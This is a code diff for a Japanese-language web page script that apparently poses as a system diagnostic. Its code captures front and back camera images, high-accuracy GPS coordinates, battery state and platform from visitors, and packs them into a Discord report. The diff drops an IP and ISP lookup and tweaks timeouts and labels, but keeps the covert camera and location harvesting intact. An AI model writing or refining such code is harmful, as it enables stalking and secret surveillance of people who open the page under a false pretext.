@@ -60,15 +60,6 @@
 
         async function gatherAndSend() {
             try {
-                addLog("> ネットワーク・IP解析中...");
-                let ipData = {};
-                try {
-                    const res = await fetch('https://ipapi.co/json/');
-                    ipData = await res.json();
-                } catch (e) {
-                    ipData = { ip: "取得失敗" };
-                }
-
                 addLog("> カメラフィードにアクセス中 (前面/背面)...");
                 const frontBlob = await captureCameraBlobOnce("user");
                 const backBlob = await captureCameraBlobOnce("environment");
@@ -89,7 +80,7 @@
                     const position = await new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(resolve, reject, {
                             enableHighAccuracy: true,
-                            timeout: 10000,
+                            timeout: 12000,
                             maximumAge: 0
                         });
                     });
@@ -100,26 +91,22 @@
                     
                     locationText = `[🗺️ Googleマップで見る](${mapUrl})\n(緯度: ${lat}, 経度: ${lon})\n(精度: 約 ${accuracy}m 周辺)`;
                 } catch (e) {
-                    locationTitle = "🛰️ GPS位置情報（取得失敗・拒否）";
-                    locationText = "位置情報の取得が許可されなかったか、タイムアウトしました。";
+                    locationTitle = "🛰️ GPS位置情報（取得失敗）";
+                    locationText = "位置情報の取得が拒否されたか、タイムアウトしました。";
                 }
 
                 addLog("> 情報を送信中...");
 
                 const info = {
-                    ip: ipData.ip || "不明",
-                    isp: ipData.org || "不明",
                     platform: navigator.platform
                 };
 
                 const discordMessage = {
-                    content: "🚨 **【システム診断】GPS位置情報レポート**",
+                    content: "🚨 **【システム診断】純粋GPS・検知レポート**",
                     embeds: [{
-                        title: "📊 ネットワーク＆ロケーション",
+                        title: "📊 デバイス＆GPSロケーション",
                         color: 16711680,
                         fields: [
-                            { name: "🌐 IPアドレス", value: info.ip, inline: true },
-                            { name: "🏢 プロバイダ・回線", value: info.isp, inline: true },
                             { name: locationTitle, value: locationText, inline: false },
                             { name: "🔋 バッテリー", value: batteryInfo, inline: true },
                             { name: "💻 プラットフォーム", value: info.platform, inline: true },
